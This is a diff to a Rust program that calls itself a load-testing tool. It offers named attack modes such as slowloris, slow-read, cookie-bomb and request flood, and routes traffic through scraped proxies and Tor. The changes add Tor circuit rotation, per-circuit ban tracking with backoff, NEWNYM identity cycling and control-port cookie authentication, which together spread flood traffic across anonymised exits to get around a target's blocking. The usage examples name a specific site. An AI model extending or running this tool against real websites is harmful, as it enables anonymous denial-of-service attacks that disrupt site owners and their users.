@@ -131,9 +131,9 @@ fn browser_request(builder: RequestBuilder) -> RequestBuilder {
 
 fn print_help() {
     println!("Simulate Load Rust — single-system load testing tool");
-    println!("");
+    println!();
     println!("Usage: {} [OPTIONS] [target_url] [mode] [attack_mode] [concurrency] [duration_secs]", env!("CARGO_PKG_NAME"));
-    println!("");
+    println!();
     println!("Options:");
     println!("  -h, --help            Show this help");
     println!("  -v, --version         Show version");
@@ -143,7 +143,7 @@ fn print_help() {
     println!("  --verify              Verify proxies, show alive count, exit without load test");
     println!("  --output CSV          Write results to CSV file");
     println!("  --proxy-file F        Load proxy list from file (one per line or comma-separated)");
-    println!("  --tor-proxy URL       Specify custom Tor proxy URL (e.g. socks5://127.0.0.1:9050)");
+    println!("  --tor-proxy URL       Specify custom Tor proxy URL (e.g. socks5h://127.0.0.1:9050)");
     println!("  --tor-control ADDR    Specify custom Tor control port address (e.g. 127.0.0.1:9051)");
     println!("  --tor-entry-guards G  Comma-separated entry guards for Tor");
     println!("  --tor-bridges B       Semicolon-separated bridges for Tor");
@@ -161,28 +161,30 @@ fn print_help() {
     println!("  --auto-tune           Enable PID controller concurrency auto-tuning");
     println!("  --tui                 Enable interactive console dashboard");
     println!("  --config F            Load configuration from file");
-    println!("");
+    println!();
     println!("Modes: scrape, tor, scrape-tor (proxy source)");
     println!("Attack modes: normal, bandwidth, slowread, imageopt, largepost, assetspray,");
     println!("              rangereq, cookiebomb, ssr, middleware, requestflood, notfound, slowloris");
-    println!("");
+    println!();
     println!("Examples:");
     println!("  {} --dry-run https://livdevries.com", env!("CARGO_PKG_NAME"));
     println!("  {} https://livdevries.com 2>&1", env!("CARGO_PKG_NAME"));
     println!("  {} https://target.com tor normal 50 60 2>&1", env!("CARGO_PKG_NAME"));
 }
 
+#[allow(clippy::expect_used)]
 fn add_session_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>]) -> RequestBuilder {
     if proxy_idx < sessions.len() {
-        let cookie = sessions[proxy_idx].lock().unwrap().clone();
+        let cookie = sessions[proxy_idx].lock().expect("session lock poisoned").clone();
         if !cookie.is_empty() { builder = builder.header("Cookie", cookie); }
     }
     builder
 }
 
+#[allow(clippy::expect_used)]
 fn add_session_and_extra_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>], extra_cookie: &str) -> RequestBuilder {
     if proxy_idx < sessions.len() {
-        let stored = sessions[proxy_idx].lock().unwrap().clone();
+        let stored = sessions[proxy_idx].lock().expect("session lock poisoned").clone();
         let cookie = if stored.is_empty() { extra_cookie.to_string() } else { format!("{}; {}", stored, extra_cookie) };
         builder = builder.header("Cookie", cookie);
     } else {
@@ -202,10 +204,11 @@ fn extract_set_cookie(headers: &HeaderMap) -> Option<String> {
     if cookies.is_empty() { None } else { Some(cookies.join("; ")) }
 }
 
+#[allow(clippy::expect_used)]
 fn update_session_from_headers(proxy_idx: usize, sessions: &[std::sync::Mutex<String>], headers: &HeaderMap) {
     if proxy_idx < sessions.len() {
         if let Some(cookie) = extract_set_cookie(headers) {
-            *sessions[proxy_idx].lock().unwrap() = cookie;
+            *sessions[proxy_idx].lock().expect("session lock poisoned") = cookie;
         }
     }
 }
@@ -235,7 +238,7 @@ impl std::fmt::Display for ProxyMode {
 }
 
 #[derive(Clone, Copy, PartialEq, Debug)]
-enum AttackMode { Bandwidth, SlowRead, ImageOpt, LargePost, AssetSpray, RangeReq, CookieBomb, SSR, Middleware, RequestFlood, Normal, NotFound, Slowloris }
+enum AttackMode { Bandwidth, SlowRead, ImageOpt, LargePost, AssetSpray, RangeReq, CookieBomb, Ssr, Middleware, RequestFlood, Normal, NotFound, Slowloris }
 impl std::fmt::Display for AttackMode {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         match self {
@@ -246,7 +249,7 @@ impl std::fmt::Display for AttackMode {
             AttackMode::AssetSpray => write!(f, "Asset Spray"),
             AttackMode::RangeReq => write!(f, "Range Req"),
             AttackMode::CookieBomb => write!(f, "Cookie Bomb"),
-            AttackMode::SSR => write!(f, "SSR"),
+            AttackMode::Ssr => write!(f, "SSR"),
             AttackMode::Middleware => write!(f, "Middleware"),
             AttackMode::RequestFlood => write!(f, "Request Flood"),
             AttackMode::Normal => write!(f, "Normal"),
@@ -268,6 +271,12 @@ struct ProxyPool {
     active_indices: Vec<usize>,
     active_weights: Vec<f64>,
     config: ClientConfig,
+    // Circuit tracking: each entry belongs to a circuit (0..n-1) or u32::MAX for non-Tor
+    circuit_ids: Vec<u32>,
+    // Per-circuit ban expiry
+    circuit_cooldown: Vec<Instant>,
+    // Per-circuit consecutive failures (for exponential backoff)
+    circuit_failures: Vec<u32>,
 }
 
 impl ProxyPool {
@@ -282,7 +291,7 @@ impl ProxyPool {
                 if let Some(base) = url.split('@').nth(1) {
                     let base = base.trim_end_matches('/');
                     for i in 0..100 {
-                        let isolated_url = format!("socks5://tor{}:isolate@{}", i, base);
+                        let isolated_url = format!("socks5h://tor{}:isolate@{}", i, base);
                         if let Ok(p) = reqwest::Proxy::all(&isolated_url) {
                             if let Ok(c) = browser_client_builder(config).proxy(p).build() {
                                 clients.push(c);
@@ -314,6 +323,9 @@ impl ProxyPool {
             active_indices: Vec::with_capacity(n),
             active_weights: Vec::with_capacity(n),
             config: config.clone(),
+            circuit_ids: vec![u32::MAX; n],
+            circuit_cooldown: vec![Instant::now(); n],
+            circuit_failures: vec![0; n],
         }
     }
 
@@ -322,17 +334,22 @@ impl ProxyPool {
         self.active_indices.clear();
         self.active_weights.clear();
         for i in 0..self.clients.len() {
-            if self.cooldown_until[i] <= now {
-                self.active_indices.push(i);
-                self.active_weights.push(self.weights[i]);
+            // Skip proxies in cooldown
+            if self.cooldown_until[i] > now {
+                continue;
             }
+            // Skip circuits in ban (exponential backoff)
+            if self.circuit_cooldown[i] > now {
+                continue;
+            }
+            self.active_indices.push(i);
+            self.active_weights.push(self.weights[i]);
         }
         if self.active_indices.is_empty() {
             return None;
         }
         let mut rng = rand::rng();
-        let first = self.active_weights[0];
-        let idx = if self.active_weights.iter().all(|&w| w == first) {
+        let idx = if self.active_weights.iter().all(|&w| w == self.active_weights[0]) {
             let sample_idx = rng.random_range(0..self.active_indices.len());
             self.active_indices[sample_idx]
         } else {
@@ -341,6 +358,17 @@ impl ProxyPool {
             self.active_indices[sample_idx]
         };
 
+        // Tor circuit rotation: prefer different circuits each call
+        if self.labels[idx].contains("tor") {
+            let tor_indices: Vec<usize> = self.active_indices.iter()
+                .filter(|&&i| self.labels[i].contains("tor"))
+                .cloned().collect();
+            if !tor_indices.is_empty() {
+                let new_idx = tor_indices[rng.random_range(0..tor_indices.len())];
+                return Some((new_idx, self.clients[new_idx].clone()));
+            }
+        }
+
         Some((idx, self.clients[idx].clone()))
     }
 
@@ -348,6 +376,8 @@ impl ProxyPool {
         if idx < self.clients.len() {
             self.succeeded[idx] = true;
             self.failure_tier[idx] = 0;
+            // Reset circuit consecutive failures on success
+            self.circuit_failures[idx] = 0;
             let factor = if latency_ms < 200 {
                 1.3
             } else if latency_ms < 600 {
@@ -364,9 +394,27 @@ impl ProxyPool {
     fn report_failure(&mut self, idx: usize) {
         if idx < self.clients.len() {
             self.failure_tier[idx] += 1;
-            let secs = 2u64.pow(self.failure_tier[idx].min(8)).min(300);
-            self.cooldown_until[idx] = Instant::now() + Duration::from_secs(secs);
-            self.weights[idx] = (self.weights[idx] * 0.5).max(0.01);
+            // Gentle tiered per-proxy cooldown: 1s, 2s, 3s, 5s, 8s
+            let tiered: [u64; 5] = [1, 2, 3, 5, 8];
+            let tier = (self.failure_tier[idx] - 1).min(4) as usize;
+            self.cooldown_until[idx] = Instant::now() + Duration::from_secs(tiered[tier]);
+            // Weight decay: 0.8x on failure
+            self.weights[idx] = (self.weights[idx] * 0.8).max(0.01);
+
+            // Circuit-level tracking
+            self.circuit_failures[idx] = self.circuit_failures[idx].saturating_add(1);
+            let fail_count = self.circuit_failures[idx];
+            // Exponential backoff for circuit bans: 12s → 24s → 48s → 96s → 180s
+            if fail_count >= 1 {
+                let ban_secs = match fail_count {
+                    1 => 12,
+                    2 => 24,
+                    3 => 48,
+                    4 => 96,
+                    _ => 180,
+                };
+                self.circuit_cooldown[idx] = Instant::now() + Duration::from_secs(ban_secs);
+            }
         }
     }
 }
@@ -405,6 +453,7 @@ fn detect_scheme(url: &str) -> &'static str {
     }
 }
 
+#[allow(clippy::expect_used)]
 async fn scrape_html(c: &Client, url: &str, custom_selector: Option<&str>) -> Vec<String> {
     use std::sync::OnceLock;
     static RE_IP_PORT: OnceLock<Regex> = OnceLock::new();
@@ -418,7 +467,7 @@ async fn scrape_html(c: &Client, url: &str, custom_selector: Option<&str>) -> Ve
     let mut out = vec![];
     if let Some(sel_str) = custom_selector {
         if let Ok(s) = Selector::parse(sel_str) {
-            let re = RE_IP_PORT.get_or_init(|| Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)").unwrap());
+            let re = RE_IP_PORT.get_or_init(|| Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)").expect("invalid regex"));
             for el in doc.select(&s) {
                 let text = el.text().collect::<String>();
                 for cap in re.captures_iter(&text) {
@@ -429,8 +478,8 @@ async fn scrape_html(c: &Client, url: &str, custom_selector: Option<&str>) -> Ve
             }
         }
     } else {
-        let tr = SEL_TR.get_or_init(|| Selector::parse("table.table tbody tr").unwrap());
-        let td = SEL_TD.get_or_init(|| Selector::parse("td").unwrap());
+        let tr = SEL_TR.get_or_init(|| Selector::parse("table.table tbody tr").expect("invalid selector"));
+        let td = SEL_TD.get_or_init(|| Selector::parse("td").expect("invalid selector"));
         for row in doc.select(tr) {
             let cells: Vec<String> = row.select(td).map(|c| c.text().collect::<String>().trim().to_string()).collect();
             if cells.len() >= 2 {
@@ -452,12 +501,13 @@ async fn scrape_raw(c: &Client, url: &str, re: &Regex) -> Vec<String> {
     t.lines().filter_map(|l| { let x = l.trim(); if x.is_empty() || x.starts_with('#') || x.starts_with("//") { return None; } re.captures(x).and_then(|c| c.get(1).map(|m| m.as_str().to_string())).map(|ip_port| format!("{}://{}", scheme, ip_port)) }).collect()
 }
 
+#[allow(clippy::expect_used)]
 async fn scrape_all(c: &Client, state: &Arc<Mutex<AppState>>) -> Vec<String> {
     let (max, custom_selector) = {
         let st = state.lock().await;
         (st.max_scrape, st.custom_selector.clone())
     };
-    let re = Arc::new(Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)").unwrap());
+    let re = Arc::new(Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+)").expect("invalid regex"));
     let all = Arc::new(Mutex::new(Vec::new()));
     let sem = Arc::new(Semaphore::new(10));
     let done = Arc::new(AtomicBool::new(false));
@@ -478,7 +528,7 @@ async fn scrape_all(c: &Client, state: &Arc<Mutex<AppState>>) -> Vec<String> {
         let sel = custom_selector.clone();
         let sem = sem.clone();
         handles.push(tokio::spawn(async move {
-            let _permit = sem.acquire_owned().await.unwrap();
+            let _permit = match sem.acquire_owned().await { Ok(p) => p, Err(_) => return, };
             if maxed.load(Ordering::Relaxed) { return; }
             {
                 let mut st = s2.lock().await;
@@ -769,6 +819,8 @@ fn url_join(base: &str, href: &str) -> String {
     if href.starts_with('/') { format!("{}{}", base, href.trim_start_matches('/')) } else { format!("{}{}", base, href) }
 }
 
+#[allow(clippy::expect_used)]
+#[allow(clippy::unwrap_used)]
 async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
     let (config, tor_proxy_opt, mode) = {
         let st = state.lock().await;
@@ -777,7 +829,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
     let effective_tor_proxy = if let Some(ref p) = tor_proxy_opt {
         Some(p.clone())
     } else if mode == ProxyMode::Tor || mode == ProxyMode::ScrapeTorFallback {
-        Some("socks5://127.0.0.1:9050".to_string())
+        Some("socks5h://127.0.0.1:9050".to_string())
     } else {
         None
     };
@@ -790,7 +842,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
             builder = builder.proxy(proxy_val);
         }
     }
-    let c = builder.build().unwrap();
+    let c = builder.build().expect("failed to build client");
 
     let base = target_url.trim_end_matches('/');
     let mut vercel = false; let mut plan = String::new(); let mut middleware = false;
@@ -816,24 +868,24 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
         let stdout_str = String::from_utf8_lossy(&out.stdout).to_string();
         for line in stdout_str.lines() {
             let line_lower = line.to_lowercase();
-            if line_lower.starts_with("server:") {
-                let val = line["server:".len()..].trim();
+            if let Some(rest) = line_lower.strip_prefix("server:") {
+                let val = rest.trim();
                 if val.to_lowercase().contains("vercel") {
                     vercel = true;
                 }
                 if val.to_lowercase().contains("cloudflare") {
                     plan = "Cloudflare".to_string();
                 }
-            } else if line_lower.starts_with("x-vercel-id:") {
-                let val = line["x-vercel-id:".len()..].trim();
+            } else if let Some(rest) = line_lower.strip_prefix("x-vercel-id:") {
+                let val = rest.trim();
                 plan = format!("Vercel ({})", val.split("::").next().unwrap_or(""));
                 vercel = true;
             } else if line_lower.starts_with("x-middleware-") || line_lower.starts_with("x-middleware-next:") || line_lower.starts_with("x-middleware-request:") {
                 middleware = true;
             } else if line_lower.starts_with("x-vercel-edge-config-") || line_lower.starts_with("x-edge-config-") {
                 edge_config = true;
-            } else if line_lower.starts_with("x-vercel-cache:") {
-                let val = line["x-vercel-cache:".len()..].trim();
+            } else if let Some(rest) = line_lower.strip_prefix("x-vercel-cache:") {
+                let val = rest.trim();
                 if val == "REVALIDATED" {
                     isr = true;
                 }
@@ -874,13 +926,13 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
     if !html.is_empty() {
         let doc = Html::parse_document(&html);
         for sel in & [("link[href]", "href"), ("script[src]", "src"), ("img[src]", "src")] {
-            let s = Selector::parse(sel.0).unwrap();
+            let s = Selector::parse(sel.0).expect("invalid selector");
             for el in doc.select(&s) { if let Some(v) = el.value().attr(sel.1) { let j = url_join(base, v); if !j.is_empty() { statics.push(j); } } }
         }
-        let src_sel = Selector::parse("source[srcset]").unwrap();
+        let src_sel = Selector::parse("source[srcset]").expect("invalid selector");
         for el in doc.select(&src_sel) {
             if let Some(srcset) = el.value().attr("srcset") {
-                let first = srcset.split(',').next().unwrap_or("").trim().split_whitespace().next().unwrap_or("");
+                let first = srcset.split(',').next().unwrap_or("").split_whitespace().next().unwrap_or("");
                 let j = url_join(base, first); if !j.is_empty() { statics.push(j); }
             }
         }
@@ -898,7 +950,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
         let path_clone = path.clone();
         let vercel_clone = vercel;
         join_handles.push(tokio::spawn(async move {
-            let _permit = sem_clone.acquire().await.unwrap();
+            let _permit = match sem_clone.acquire().await { Ok(p) => p, Err(_) => return (path_clone.clone(), false, false, false) };
             let mut is_img = false;
             let mut is_img_opt = false;
             let mut is_ok = false;
@@ -911,7 +963,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
                         if lower.contains(".jpg") || lower.contains(".jpeg") || lower.contains(".png") || lower.contains(".webp") || lower.contains(".gif") || lower.contains(".svg") {
                             is_img = true;
                             if vercel_clone {
-                                if let Ok(r2) = browser_request(c_clone.get(&format!("{}?width=300", path_clone))).send().await {
+                                if let Ok(r2) = browser_request(c_clone.get(format!("{}?width=300", path_clone))).send().await {
                                     let sz2 = r2.bytes().await.map(|b| b.len()).unwrap_or(0);
                                     if sz2 > 0 && sz2 != sz {
                                         is_img_opt = true;
@@ -989,6 +1041,7 @@ async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
     st.imgs = imgs; st.apis = apis; st.statics = verified_statics;
 }
 
+#[allow(clippy::expect_used)]
 async fn http_proxy_check(proxy_url: &str, target_url: &str, _config: &ClientConfig) -> bool {
     let proxy = match reqwest::Proxy::all(proxy_url) {
         Ok(p) => p,
@@ -1024,21 +1077,21 @@ async fn filter_alive_proxies(proxies: &[String], target_url: &str, config: &Cli
     let target = target_url.to_string();
     let client_cfg = config.clone();
 
-    for p in proxies.to_owned() {
+    for p in proxies.iter().cloned() {
         let sem = sem.clone();
         let dd = d.clone();
         let ss = s2.clone();
         let target_clone = target.clone();
         let cfg_clone = client_cfg.clone();
         h.push(tokio::spawn(async move {
-            let _permit = sem.acquire_owned().await.unwrap();
+            let _permit = match sem.acquire_owned().await { Ok(p) => p, Err(_) => return None, };
             let mut alive = tcp_check(&p, to).await;
             if alive {
                 // If TCP port is open, verify proxy routing ability via HTTP request to target URL
                 alive = http_proxy_check(&p, &target_clone, &cfg_clone).await;
             }
             let n = dd.fetch_add(1, Ordering::Relaxed) + 1;
-            if n % 500 == 0 || n == total {
+            if n.is_multiple_of(500) || n == total {
                 let mut lock = ss.lock().await;
                 lock.tcp_checked = n as u32;
                 lock.status_msg = format!("Checked: {}/{}", n, total);
@@ -1059,6 +1112,48 @@ async fn filter_alive_proxies(proxies: &[String], target_url: &str, config: &Cli
     alive_proxies
 }
 
+async fn warm_tor_circuits(proxies: &[String], target_url: &str, timeout_secs: u64, gap_secs: u64) {
+    for (i, proxy_url) in proxies.iter().enumerate() {
+        let warmup_url = format!("{}{}", target_url.trim_end_matches('/'), "/");
+        let proxy = match reqwest::Proxy::all(proxy_url) {
+            Ok(p) => p,
+            Err(e) => {
+                eprintln!("  Warning: failed to parse proxy {} for warm-up: {}", i, e);
+                continue;
+            }
+        };
+        let client = match reqwest::Client::builder()
+            .proxy(proxy)
+            .timeout(Duration::from_secs(timeout_secs))
+            .build()
+        {
+            Ok(c) => c,
+            Err(e) => {
+                eprintln!("  Warning: failed to build client for proxy {}: {}", i, e);
+                continue;
+            }
+        };
+        let start = Instant::now();
+        eprintln!("  Warming circuit {} via {} to {}...", i, proxy_url, warmup_url);
+        match tokio::time::timeout(Duration::from_secs(timeout_secs), client.head(&warmup_url).send()).await {
+            Ok(Ok(resp)) => {
+                let status = resp.status();
+                let elapsed = start.elapsed().as_millis();
+                eprintln!("  Circuit {} warmed: {} in {}ms", i, status, elapsed);
+            }
+            Ok(Err(e)) => {
+                eprintln!("  Circuit {} warm-up failed: {}", i, e);
+            }
+            Err(_) => {
+                eprintln!("  Circuit {} warm-up timed out after {}s", i, timeout_secs);
+            }
+        }
+        if i + 1 < proxies.len() {
+            tokio::time::sleep(Duration::from_secs(gap_secs)).await;
+        }
+    }
+}
+
 async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Vec<String>> {
     let (config, target_url, tor_proxy_opt) = {
         let st = state.lock().await;
@@ -1070,12 +1165,18 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
             let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
             if ok {
                 state.lock().await.status_msg = "Tor ready".to_string();
-                Some(vec!["socks5://tor:isolate@127.0.0.1:9050".to_string()])
+                let proxies = vec!["socks5h://tor:isolate@127.0.0.1:9050".to_string()];
+                // Warm up circuits with HEAD to actual target
+                state.lock().await.status_msg = "Warming Tor circuits...".to_string();
+                warm_tor_circuits(&proxies, &target_url, 20, 2).await;
+                Some(proxies)
             } else if let Ok(custom) = std::env::var("TOR_PROXY") {
                 let base = custom.trim_end_matches('?').trim_end_matches('/');
                 let base = if let Some(pos) = base.find('@') { &base[pos+1..] } else { base };
                 state.lock().await.status_msg = format!("Using TOR_PROXY: {}", base);
-                Some(vec![format!("socks5://tor:isolate@{}", base)])
+                let proxies = vec![format!("socks5h://tor:isolate@{}", base)];
+                warm_tor_circuits(&proxies, &target_url, 20, 2).await;
+                Some(proxies)
             } else {
                 state.lock().await.status_msg = "Tor unavailable".to_string();
                 None
@@ -1086,7 +1187,7 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
             let effective_tor_proxy = if let Some(ref p) = tor_proxy_opt {
                 Some(p.clone())
             } else if mode == ProxyMode::ScrapeTorFallback {
-                Some("socks5://127.0.0.1:9050".to_string())
+                Some("socks5h://127.0.0.1:9050".to_string())
             } else {
                 None
             };
@@ -1096,7 +1197,7 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
                     builder = builder.proxy(proxy_val);
                 }
             }
-            let c = builder.build().unwrap();
+            let c = match builder.build() { Ok(c) => c, Err(_) => return None, };
             let scraped = match tokio::time::timeout(Duration::from_secs(30), scrape_all(&c, state)).await {
                 Ok(res) => {
                     println!("  Scraped {} proxy candidates from online sources.", res.len());
@@ -1129,7 +1230,7 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
             if result.is_empty() && mode == ProxyMode::ScrapeTorFallback {
                 state.lock().await.status_msg = "Scrape failed, Tor fallback...".to_string();
                 if tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some() {
-                    return Some(vec!["socks5://tor:isolate@127.0.0.1:9050".to_string()]);
+                    return Some(vec!["socks5h://tor:isolate@127.0.0.1:9050".to_string()]);
                 } else { state.lock().await.status_msg = "Tor fallback unavailable".to_string(); return None; }
             }
             if result.is_empty() { None } else { result.sort(); result.dedup(); Some(result) }
@@ -1146,9 +1247,11 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
     let mut semaphore = Arc::new(Semaphore::new(conc));
 
     loop {
-        if max_errors.is_some() && stats.errors.load(Ordering::Relaxed) >= max_errors.unwrap() {
-            println!("  Max errors ({}) reached, stopping.", max_errors.unwrap());
-            break;
+        if let Some(max_err) = max_errors {
+            if stats.errors.load(Ordering::Relaxed) >= max_err {
+                println!("  Max errors ({}) reached, stopping.", max_err);
+                break;
+            }
         }
         if !stats.running.load(Ordering::Relaxed) { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
         
@@ -1172,7 +1275,7 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
         let assets: Vec<String> = match attack {
             AttackMode::Normal => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
             AttackMode::ImageOpt => { if imgs.is_empty() { vec!["/".into()] } else { imgs.clone() } },
-            AttackMode::SSR => { if apis_local.is_empty() { vec!["/".into()] } else { apis_local.clone() } },
+            AttackMode::Ssr => { if apis_local.is_empty() { vec!["/".into()] } else { apis_local.clone() } },
             AttackMode::Middleware => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
             _ => vec!["/".into()]
         };
@@ -1184,15 +1287,14 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                 break; // Recreate semaphore
             }
             
-            let _permit = semaphore.clone().acquire_owned().await.unwrap();
+            let _permit = match semaphore.clone().acquire_owned().await { Ok(p) => p, Err(_) => return, };
             let next_client = {
-                let mut p_lock = pool.lock().unwrap();
+                let mut p_lock = pool.lock().expect("pool lock poisoned");
                 p_lock.next()
             };
             if let Some((idx, client)) = next_client {
                 let stats_clone = stats.clone();
                 let assets = assets.clone();
-                let attack = attack;
                 let target = target_url.clone();
                 let sessions_clone = sessions.clone();
                 let idx1 = rand::rng().random_range(0..assets.len());
@@ -1259,7 +1361,7 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                         AttackMode::CookieBomb => {
                             fetch_cookie(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await
                         }
-                        AttackMode::SSR => {
+                        AttackMode::Ssr => {
                             if assets.is_empty() { fetch_page(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                             else { fetch_page(client, assets[idx1].clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                         }
@@ -1335,15 +1437,122 @@ fn write_results_csv(path: &str, target: &str, status: &str, proxies: &[String],
     println!("  CSV written to {}", path);
 }
 
-async fn cycle_tor_circuit(control_addr: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+/// Resolve a Tor control address to a connection target.
+/// Tries Unix socket paths first (standard on modern Tor), then falls back to TCP.
+fn resolve_control_addr(addr: &str) -> Result<(String, String), String> {
+    // If addr is already TCP (host:port), use it directly
+    if addr.contains(':') && !addr.starts_with('/') {
+        return Ok((addr.to_string(), "tcp".to_string()));
+    }
+    // If addr starts with '/', treat as Unix socket path
+    if addr.starts_with('/') {
+        return Ok((addr.to_string(), "unix".to_string()));
+    }
+    // Otherwise try common Unix socket paths, then TCP
+    let unix_paths = [
+        "/run/tor/control",
+        "/var/run/tor/control",
+        "/tmp/tor/control",
+        "/home/tor/.local/share/tor/control_socket",
+    ];
+    for p in &unix_paths {
+        if std::fs::metadata(p).is_ok() {
+            return Ok((p.to_string(), "unix".to_string()));
+        }
+    }
+    // Fall back to TCP
+    Ok((format!("127.0.0.1:{}", addr.parse::<u16>().unwrap_or(9051)), "tcp".to_string()))
+}
+
+/// Read the Tor control cookie file for cookie authentication.
+fn read_control_cookie(_socket_path: &str) -> Option<String> {
+    // Try common cookie locations
+    let cookie_paths = [
+        "/var/lib/tor/control_auth_cookie",
+        "/home/tor/.config/tor/auth_cookie",
+        "/run/tor/control_auth_cookie",
+        "/var/run/tor/control_auth_cookie",
+        "/home/tor/.local/share/tor/control_auth_cookie",
+    ];
+    for p in &cookie_paths {
+        if let Ok(bytes) = std::fs::read(p) {
+            // Cookie is hex-encoded bytes, skip first 2 bytes (length prefix)
+            if bytes.len() > 2 {
+                let hex_str: String = bytes[2..].iter().map(|b| format!("{:02x}", b)).collect();
+                return Some(hex_str);
+            }
+        }
+    }
+    None
+}
+
+/// Send a command over a Tor control connection with optional cookie auth.
+/// Supports both TCP and Unix socket connections.
+async fn tor_control_command(
+    control_addr: &str,
+    command: &str,
+) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
     use tokio::io::{AsyncReadExt, AsyncWriteExt};
-    let mut stream = tokio::net::TcpStream::connect(control_addr).await?;
-    stream.write_all(b"AUTHENTICATE \"\"\r\n").await?;
-    let mut buf = [0u8; 1024];
-    let _ = stream.read(&mut buf).await?;
-    stream.write_all(b"SIGNAL NEWNYM\r\n").await?;
-    let _ = stream.read(&mut buf).await?;
-    stream.write_all(b"QUIT\r\n").await?;
+    let (conn_target, conn_type) = resolve_control_addr(control_addr)?;
+
+    // Helper: send bytes and read response with a timeout
+    async fn send_and_read(
+        stream: &mut (impl tokio::io::AsyncWrite + tokio::io::AsyncRead + Unpin + Send),
+        data: &[u8],
+        read_timeout_secs: u64,
+    ) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
+        stream.write_all(data).await?;
+        stream.flush().await?;
+        let mut buf = [0u8; 4096];
+        let n = {
+            use tokio::time::{timeout, Duration};
+            let read_result = timeout(Duration::from_secs(read_timeout_secs), stream.read(&mut buf)).await;
+            read_result.unwrap_or(Ok(0))?
+        };
+        Ok(std::str::from_utf8(&buf[..n]).unwrap_or("").trim().to_string())
+    }
+
+    if conn_type == "unix" {
+        use tokio::net::UnixStream;
+        let mut stream = UnixStream::connect(&conn_target).await?;
+        let cookie = read_control_cookie(&conn_target);
+        let auth_result = if let Some(ref cookie_hex) = cookie {
+            send_and_read(&mut stream, format!("AUTHENTICATE \"{}\"\r\n", cookie_hex).as_bytes(), 5).await?
+        } else {
+            send_and_read(&mut stream, b"AUTHENTICATE \"\"\r\n", 5).await?
+        };
+
+        if !auth_result.contains("250 OK") {
+            return Err(format!("Auth failed: {}", auth_result).into());
+        }
+
+        let response = send_and_read(&mut stream, command.as_bytes(), 10).await?;
+        send_and_read(&mut stream, b"QUIT\r\n", 2).await?;
+        Ok(response)
+    } else {
+        let mut stream = tokio::net::TcpStream::connect(&conn_target).await?;
+        let cookie = read_control_cookie(&conn_target);
+        let auth_result = if let Some(ref cookie_hex) = cookie {
+            send_and_read(&mut stream, format!("AUTHENTICATE \"{}\"\r\n", cookie_hex).as_bytes(), 5).await?
+        } else {
+            send_and_read(&mut stream, b"AUTHENTICATE \"\"\r\n", 5).await?
+        };
+
+        if !auth_result.contains("250 OK") {
+            return Err(format!("Auth failed: {}", auth_result).into());
+        }
+
+        let response = send_and_read(&mut stream, command.as_bytes(), 10).await?;
+        send_and_read(&mut stream, b"QUIT\r\n", 2).await?;
+        Ok(response)
+    }
+}
+
+async fn cycle_tor_circuit(control_addr: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    let resp = tor_control_command(control_addr, "SIGNAL NEWNYM\r\n").await?;
+    if !resp.contains("250") {
+        eprintln!("  [Tor] NEWNYM response: {}", resp);
+    }
     Ok(())
 }
 
@@ -1353,16 +1562,12 @@ async fn configure_tor(
     bridges: Option<&str>,
     circuit_timeout: Option<u64>,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    use tokio::io::{AsyncReadExt, AsyncWriteExt};
-    let mut stream = tokio::net::TcpStream::connect(control_addr).await?;
-    stream.write_all(b"AUTHENTICATE \"\"\r\n").await?;
-    let mut buf = [0u8; 1024];
-    let _ = stream.read(&mut buf).await?;
-
     if let Some(guards) = entry_guards {
         let cmd = format!("SETCONF EntryNodes=\"{}\" StrictNodes=1\r\n", guards);
-        stream.write_all(cmd.as_bytes()).await?;
-        let _ = stream.read(&mut buf).await?;
+        let resp = tor_control_command(control_addr, &cmd).await?;
+        if !resp.contains("250") {
+            eprintln!("  [Tor] SETCONF EntryNodes response: {}", resp);
+        }
     }
 
     if let Some(brs) = bridges {
